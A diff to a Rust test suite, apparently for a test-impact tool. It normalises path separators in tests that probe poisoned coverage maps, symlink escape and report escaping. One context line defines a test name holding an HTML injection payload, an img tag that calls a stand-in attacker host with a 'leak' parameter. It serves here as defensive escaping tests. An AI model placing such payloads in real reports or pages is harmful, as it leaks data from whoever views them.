@@ -55,7 +55,7 @@ fn repo(name: &str, files_extra: &[(&str, &str)], map: impl Fn(&Repo) -> String)
 }
 
 fn std_map(r: &Repo, extra: &str) -> String {
-    let d = r.dir.to_string_lossy();
+    let d = r.dir.to_string_lossy().replace('\\', "/");
     format!(
         r#"{{"t":"meta","version":2,"gitHead":"{sha}"}}
 {{"t":"file","file":"{d}/src/price.ts","blocks":[[1,26,4,1,"f"],[2,14,2,22,"b"]]}}
@@ -165,7 +165,7 @@ fn f7_provenance_and_poisoning() {
     assert_eq!(affected(&r, &["--git", "HEAD", "--json"]).status.code(), Some(3));
     // PoC 7: a file with blocks that no test hits and no fileload loads → must not give "0 tests"
     let r = repo("f7d", &[("src/ghost.ts", "export function g() {\n  return 1;\n}\n")], |r| {
-        let d = r.dir.to_string_lossy().to_string();
+        let d = r.dir.to_string_lossy().replace('\\', "/");
         std_map(r, &format!(r#"{{"t":"file","file":"{d}/src/ghost.ts","blocks":[[1,21,3,1,"f"]]}}"#))
     });
     std::fs::write(r.dir.join("src/ghost.ts"), "export function g() {\n  return 2;\n}\n").unwrap();
@@ -173,7 +173,7 @@ fn f7_provenance_and_poisoning() {
     assert_eq!(o.status.code(), Some(3), "{}", String::from_utf8_lossy(&o.stdout));
     // hits on unknown block ids = inconsistent map
     let r = repo("f7e", &[], |r| {
-        let d = r.dir.to_string_lossy().to_string();
+        let d = r.dir.to_string_lossy().replace('\\', "/");
         std_map(
             r,
             &format!(r#"{{"t":"test","file":"{d}/test/p.test.ts","name":"p > x","line":9,"state":"pass","hits":{{"{d}/src/price.ts":[99]}}}}"#),
@@ -210,7 +210,7 @@ const POC4_NAME: &str = "a ok` <img src=\\\"https://attacker.invalid/px.png?leak
 #[test]
 fn f10_report_and_terminal_escaping() {
     let r = repo("f10", &[], |r| {
-        let d = r.dir.to_string_lossy().to_string();
+        let d = r.dir.to_string_lossy().replace('\\', "/");
         std_map(
             r,
             &format!(r#"{{"t":"test","file":"{d}/test/p.test.ts","name":"{POC4_NAME}","line":7,"state":"pass","hits":{{"{d}/src/price.ts":[0,1]}}}}"#),
@@ -288,7 +288,7 @@ fn f17_vitest_output() {
 fn f19_symlinks_not_followed() {
     let r = repo("f19", &[], |r| std_map(r, ""));
     let outside = r.dir.join("outside.jsonl");
-    let d = r.dir.to_string_lossy().to_string();
+    let d = r.dir.to_string_lossy().replace('\\', "/");
     std::fs::write(
         &outside,
         format!(r#"{{"t":"test","file":"{d}/test/evil.test.ts","name":"evil","line":1,"state":"pass","hits":{{}}}}"#) + "\n",
